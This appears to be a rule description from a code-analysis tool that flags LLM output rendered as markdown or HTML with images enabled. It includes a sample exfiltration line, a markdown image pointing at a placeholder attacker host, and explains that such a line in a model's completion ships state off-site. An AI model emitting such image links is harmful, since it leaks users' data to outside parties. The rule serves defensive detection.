# FLAW153 — Model output rendered with images enabled

**Severity:** medium · **Tag:** security · CWE-79

## What
Model/completion output flows through a markdown-to-HTML renderer or into `dangerouslySetInnerHTML` without disallowing images or pinning hosts. A single `![](https://attacker/exfil)` line in the completion then ships state off-site. Disable images, set an allowlist via `transformImageUri` / `disallowedElements`, or use a sanitizer with an image-host allowlist.

## Fix
See the rule description and the detector at `src/rules/markdown_image_from_model.cr`.
